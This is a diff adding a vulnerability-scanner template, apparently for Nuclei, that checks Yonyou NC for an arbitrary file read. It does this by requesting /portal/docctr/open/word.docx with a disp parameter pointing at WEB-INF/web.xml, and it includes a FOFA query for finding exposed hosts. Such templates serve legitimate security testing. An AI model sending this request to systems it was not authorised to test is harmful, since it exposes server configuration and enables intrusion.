@@ -1,0 +1,32 @@
+id: yonyou-nc-word-docx-fileread
+
+info:
+  name: 用友 NC word.docx 任意文件读取
+  author: Y3y1ng
+  severity: high
+  description: |
+    用友 NC /portal/docctr/open/word.docx 可通过 disp 读取 WEB-INF/web.xml，响应含 NC Portal。属 NC 而非 U8 Cloud / YonBIP / GRP。
+  reference:
+    - https://github.com/zan8in/afrog
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="UClient.dmg"
+  tags: yonyou,nc,fileread
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/docctr/open/word.docx?disp=/WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<?xml"
+          - "encoding"
+          - "NC Portal"
+        condition: and
+      - type: status
+        status:
+          - 200
